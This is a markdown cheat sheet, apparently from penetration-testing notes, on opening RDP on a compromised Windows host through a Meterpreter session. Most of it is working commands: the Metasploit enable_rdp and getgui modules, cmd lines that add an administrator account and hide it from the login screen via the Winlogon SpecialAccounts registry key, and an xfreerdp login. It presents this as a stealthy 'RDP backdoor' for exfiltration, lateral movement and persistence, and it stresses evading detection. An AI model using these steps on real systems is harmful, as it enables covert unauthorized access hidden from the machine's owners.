# Enabling RDP for Remote Desktop Access

By default, Windows keeps port **3389** closed. If you have an active Meterpreter session with **SYSTEM** or **Admin** privileges, you can force it open using multiple methods.

---
## üõ†Ô∏è Method 1: Enable RDP via Metasploit Module

```msf
search enable_rdp
use post/windows/manage/enable_rdp
set SESSION <ID>
exploit
```

‚úÖ **What it does**:
- Sets registry key `fDenyTSConnections = 0`
- Enables Windows Firewall rule for RDP (`Remote Desktop`)
- Starts the **TermService** if stopped

> ‚ö†Ô∏è **Does NOT create a user** ‚Äî you must handle credentials separately.

---
## üõ†Ô∏è Method 2: Enable RDP + Create Stealth User via `getgui`

```msf
meterpreter > run getgui -e -u new_user -p hacker_123321
```

### üîç What `getgui` Does:
| Action | Technical Detail |
|-------|------------------|
| **Enables RDP** | Same as `enable_rdp` module (registry + firewall) |
| **Creates user** | `net user new_user hacker_123321 /add` |
| **Grants admin rights** | Adds to `Administrators` group |
| **Hides from login screen** | Sets registry: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\new_user = 0` |
| **Adds to RDP group** | `net localgroup "Remote Desktop Users" new_user /add` |

‚úÖ **Result**:  
- Fully functional admin account  
- **Invisible on login screen** (stealthy)  
- Ready for RDP immediately  

> üí° **Why stealth?**  
> Normal users won‚Äôt see `new_user` at login ‚Üí avoids suspicion

---
## üîê Prepare Credentials (If Not Using `getgui`)

### Option A: Change Admin Password (Risky)
```cmd
net user administrator NewPassword123!
```
> ‚ùå **Avoid**: Locks out real user ‚Üí immediate detection

### Option B: Create Hidden Admin (Manual)
```cmd
net user backup_admin Pass123! /add
net localgroup "Remote Desktop Users" backup_admin /add
net localgroup Administrators backup_admin /add
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v backup_admin /t REG_DWORD /d 0 /f
```

---
## üíª Connect via RDP from Kali

Use `xfreerdp` for full-featured connection:

```bash
xfreerdp /u:new_user /p:hacker_123321 /v:192.168.1.10 /dynamic-resolution +clipboard
```

### Key Flags:
| Flag | Purpose |
|------|--------|
| `/dynamic-resolution` | Auto-adjusts window size |
| `+clipboard` | Enables copy/paste between host/target |
| `/cert:ignore` | Bypasses certificate warnings (add if needed) |

> ‚úÖ **Success**: Full GUI desktop as admin ‚Äî ideal for data exfiltration, lateral movement, or persistence.

---
## üîë Critical Notes

- **`getgui` requires SYSTEM/Admin rights** ‚Äî fails as low-priv user  
- **Always hide accounts** in real engagements ‚Äî visibility = detection  
- **RDP is noisy** ‚Äî use only when necessary (logs: Event ID 4624, 4625)  
- **Prefer `getgui` over manual steps** ‚Äî it‚Äôs faster and handles stealth automatically

> üî• **Golden Rule**:  
> **`run getgui -e -u <user> -p <pass>` = One-command RDP backdoor with stealth.**

